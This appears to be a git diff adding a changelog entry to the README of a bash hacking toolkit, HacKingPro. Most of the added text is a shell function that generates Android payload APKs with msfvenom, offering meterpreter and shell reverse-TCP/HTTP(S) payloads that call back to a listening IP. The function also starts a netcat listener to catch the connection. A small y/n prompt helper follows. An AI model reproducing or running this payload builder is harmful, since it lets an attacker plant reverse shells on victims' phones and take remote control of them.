@@ -20,10 +20,197 @@
 
 ---
 
-#### **ToDO**
+### 🎯 **ToDO**
 * [ ] [f8x](https://github.com/ffffffff0x/f8x) | Red/Blue team environment automation deployment tool
 * [ ]
 
+---
+
+# 🔮 Changelog 🔮
+
+
+> 🔮 | Released | HacKingPro | v0.0.0.27 | 09:40 | 10/08/2022 | 🔮
+### ➕ BugFix 🔮
+- [x] Every Enter hit Getting refreshing Netwrok Status   
+### ➕ New Functions 🔮
+- [x] #### `CreateAndroidShell`  
+- [x] #### `AndroidPayLoadPro` | # Creating Android  PayLoad with `msfvenom`
+```sh
+AndroidPayLoadPro(){
+  CreateAndroidShell(){
+    msfvenom -p $apv LHOST=${LocalHostIP} LPORT=$lport R > ${MainDirectoriyCaseName}/$payload.apk
+  }
+  clear
+  while true; do
+    #statements
+    cd "${MainDirectoriyCaseName}"
+    clear
+    TargetStatusRun
+    AndroidPayLoadProMenu=$(echo "
+    ${LGreen}╔═╗╔╗╔╔╦╗╦═╗╔═╗╦╔╦╗     ${LRed}╔═╗╔═╗╦ ╦╦  ╔═╗╔╦╗
+    ${LGreen}╠═╣║║║ ║║╠╦╝║ ║║ ║║     ${LRed}╠═╝╠═╣╚╦╝║  ║ ║ ║║
+    ${LGreen}╩ ╩╝╚╝═╩╝╩╚═╚═╝╩═╩╝     ${LRed}╩  ╩ ╩ ╩ ╩═╝╚═╝═╩╝${DGrey}
+    :::::::::::::::: [ TYPE ] ::::::::::::::::::
+
+    ${DGrey}┏➡${BYellow}╼▰ ${BRed}[${ORANGE} ${slowBlink}P${resetT} ${BRed}]${BYellow}╼▰ ${BRed}[${ORANGE} Planning PayLoad ${BRed}]
+    ${DGrey}┗┲──⇢${BYellow}╼▰ ${BRed}[${ORANGE} Export Name ${BRed}]${BYellow}╼▰ ${BRed}[${LYellow} ${payload} ${BRed}]${BYellow}╼▰
+    ${DGrey} ┣──⇢${BYellow}╼▰ ${BRed}[${ORANGE} Listening IP ${BRed}]${BYellow}╼▰ ${BRed}[${LYellow} ${LocalHostIP} ${BRed}]${BYellow}╼▰
+    ${DGrey} ┣──⇢${BYellow}╼▰ ${BRed}[${ORANGE} Listening Port ${BRed}]${BYellow}╼▰ ${BRed}[${LYellow} ${lport} ${BRed}]${BYellow}╼▰
+    ${DGrey} ┗──⇢${BYellow}╼▰ ${BRed}[${ORANGE} Payload Location ${BRed}]${BYellow}╼▰ ${BRed}[${LYellow} ${apv} ${BRed}]${BYellow}╼▰
+
+    ${DGrey}┏⇢${BYellow}╼▰ ${BRed}[${ORANGE} ${slowBlink}CP${resetT} ${BRed}]${BYellow}╼▰ ${BRed}[${ORANGE} Choose PayLoad ${BRed}]
+    ${DGrey}┗┲──⇢${BYellow}╼▰ ${BRed}[${ORANGE} 1 ${BRed}]${BYellow}╼▰ ${BRed}[${LYellow} android/meterpreter/reverse_http ${BRed}]${BYellow}╼▰
+    ${DGrey} ┣──⇢${BYellow}╼▰ ${BRed}[${ORANGE} 2 ${BRed}]${BYellow}╼▰ ${BRed}[${LYellow} android/meterpreter/reverse_https ${BRed}]${BYellow}╼▰
+    ${DGrey} ┣──⇢${BYellow}╼▰ ${BRed}[${ORANGE} 3 ${BRed}]${BYellow}╼▰ ${BRed}[${LYellow} android/meterpreter/reverse_tcp ${BRed}]${BYellow}╼▰
+    ${DGrey} ┣──⇢${BYellow}╼▰ ${BRed}[${ORANGE} 4 ${BRed}]${BYellow}╼▰ ${BRed}[${LYellow} android/meterpreter_reverse_http ${BRed}]${BYellow}╼▰
+    ${DGrey} ┣──⇢${BYellow}╼▰ ${BRed}[${ORANGE} 5 ${BRed}]${BYellow}╼▰ ${BRed}[${LYellow} android/meterpreter_reverse_https ${BRed}]${BYellow}╼▰
+    ${DGrey} ┣──⇢${BYellow}╼▰ ${BRed}[${ORANGE} 6 ${BRed}]${BYellow}╼▰ ${BRed}[${LYellow} android/meterpreter_reverse_tcp ${BRed}]${BYellow}╼▰
+    ${DGrey} ┣──⇢${BYellow}╼▰ ${BRed}[${ORANGE} 7 ${BRed}]${BYellow}╼▰ ${BRed}[${LYellow} android/shell/reverse_http ${BRed}]${BYellow}╼▰
+    ${DGrey} ┣──⇢${BYellow}╼▰ ${BRed}[${ORANGE} 8 ${BRed}]${BYellow}╼▰ ${BRed}[${LYellow} android/shell/reverse_https ${BRed}]${BYellow}╼▰
+    ${DGrey} ┗──⇢${BYellow}╼▰ ${BRed}[${ORANGE} 9 ${BRed}]${BYellow}╼▰ ${BRed}[${LYellow} android/shell/reverse_tcp ${BRed}]${BYellow}╼▰
+
+    ${DGrey}┏➡${BYellow}╼▰ ${BRed}[${LCyan} ${slowBlink}EP${resetT} ${BRed}]${BYellow}╼▰ ${BRed}[${LCyan} Export PayLoad ${BRed}]
+    ${DGrey}┗┲──⇢${BYellow}╼▰ ${BRed}[${BCyan} Export Location ${BRed}]${BYellow}╼▰ ${BRed}[${BCyan} ${MainDirectoriyCaseName}/$paylod.apk  ${BRed}]${BYellow}╼▰
+    ${DGrey} ┗──⇢${BYellow}╼▰ ${BRed}[${BGreen} Command Executed ${BRed}]${BYellow}╼▰ ${BRed}[${BGreen} msfvenom -p $apv LHOST=${LocalHostIP} LPORT=$lport R > ${MainDirectoriyCaseName}/$payload.apk ${BRed}]${BYellow}╼▰
+
+    ${DGrey}┏➡${BYellow}╼▰ ${BRed}[${LGreen} ${slowBlink}SL${resetT} ${BRed}]${BYellow}╼▰ ${BRed}[${LGreen} Start Listener ${BRed}]
+    ${DGrey}┗──⇢${BYellow}╼▰ ${BRed}[${BGreen} Command Executed ${BRed}]${BYellow}╼▰ ${BRed}[${BGreen} nc -l ${lport} ${BRed}]${BYellow}╼▰
+
+    ${BGreen}┏──${BRed}[${DGrey} ~$(pwd) ${BRed}]
+    ${BGreen}|
+    ${BGreen}┗──${BRed}[${BYellow} $Anlominus ${BRed}]${BYellow}╼▰  ${BRed}[${BGreen} ${HacKingPro} ${BRed}]${BYellow}╼▰  ${BRed}[${BGreen} Exploitation ${BRed}]${BYellow}╼▰  ${BRed}[${BGreen} Android PayLoad ${BRed}]${BYellow}╼▰  ${BGreen}  ")
+    read -p "${AndroidPayLoadProMenu}" cmd
+    case "$cmd" in
+      p|P)
+      SettingPayload(){
+        echo " "
+        echo "    ${DGrey}┏➡ ${BRed}[${ORANGE} Setting PayLoad ${BRed}]${BYellow}╼▰  "
+
+        abc1="$(echo "    ${DGrey}┗┲──⇢ ${BRed}[${ORANGE} Enter File Name ${BRed}]${BYellow}╼▰  ")"
+        if [ -z ${payload} ]; then
+          #statements
+          payload="AnLoMinus"
+        else
+          read -p "${abc1}" payload
+        fi
+
+        if [ -z "${LocalHostIP}" ]; then
+          #statements
+          abc2="$(echo "    ${DGrey} ┣──⇢ ${BRed}[${ORANGE} Enter Listening IP ${LocalHostIP} ${BRed}]${BYellow}╼▰  ")"
+          read -p "${abc2}" LocalHostIP
+        fi
+        if [ -z "${LocalHostIP}" ]; then
+        LocalHostIP="127.0.0.1"
+      fi
+
+        abc3="$(echo "    ${DGrey} ┗──⇢ ${BRed}[${ORANGE} Enter Listening Port ${BRed}]${BYellow}╼▰  ")"
+        if [ -z ${lport} ]; then
+          #statements
+          lport="4444"
+        else
+          read -p "${abc3}" lport
+        fi
+      }
+      SettingPayload
+
+      ;;
+      ep|EP)
+      CreateAndroidShell
+      read -p "${Press_ENTER}"
+      ;;
+      sl|SL)
+      nc -l ${lport}
+      # nc -l ${lport} | nc ${UserName} ${TargetPort}
+      read -p "${Press_ENTER}"
+      ;;
+      1)
+      clear
+      apv='android/meterpreter/reverse_http'
+      ;;
+      2)
+      clear
+      apv='android/meterpreter/reverse_https'
+      ;;
+      3)
+      clear
+      apv='android/meterpreter/reverse_tcp'
+      ;;
+      4)
+      clear
+      apv='android/meterpreter_reverse_http'
+      ;;
+      5)
+      clear
+      apv='android/meterpreter_reverse_https'
+      ;;
+      6)
+      clear
+      apv='android/meterpreter_reverse_tcp'
+      ;;
+      7)
+      clear
+      apv='android/shell/reverse_http'
+      ;;
+      8)
+      clear
+      apv='android/shell/reverse_https'
+      ;;
+      9)
+      clear
+      apv='android/shell/reverse_tcp'
+      ;;
+      ls )
+      lahs
+      ;;
+      x|X|exit|quit|Exit )
+      clear
+      cd ${MainDirectoriy}
+      HacKingPro=$(echo "${BRed}Hac${BYellow}King${BBlue}Pro")
+      echo "\n\t\t ${BRed}[🙏🏼${BRed}] ${BWhite}Exit ${HacKingPro} ${BRed}[🙏🏼${BRed}]\n\t\t ${BGreen}"
+      break
+      ;;
+      * )
+      echo "$InvalidOption"
+      ;;
+    esac
+  done
+
+}
+```
+
+
+- [x] #### 🤩 `AwesomeAsking` 🤩
+> ### Asking for Running Fuctions Builtin and Commands
+#### ✅ `Function for Asking To Run Functions or Commands`
+
+```sh
+####################
+#| ✅ | AwesomeAsking
+######################
+
+AwesomeAsking(){
+  while  true; do
+    #statements
+    AwesomeAskingEcho="$(echo "
+    ${ORANGE}┌╼▰ ${LGreen}[${LYellow} $1 ${LGreen}]
+    ${ORANGE}┖─╼▰ ${LGreen}[ ${LGrey}y/Y ${LGreen}]${ORANGE}──${LGreen}[ ${LGrey}n/N ${LGreen}] ${ORANGE}──────╼▰  ${LGrey}")"
+    read -p "${AwesomeAskingEcho}"  AwesomeAskingCmd
+    case $AwesomeAskingCmd in
+      y|Y|yes|YES)
+      (echo "$1")
+      ;;
+      n|N|no|NO)
+      break
+      ;;
+      * )
+      break
+      ;;
+    esac
+  done
+}
+
+AwesomeAsking CheckRequiredPro "Want Checking Requirements?"
+```
 ---
 
 # 🔮 Changelog 🔮
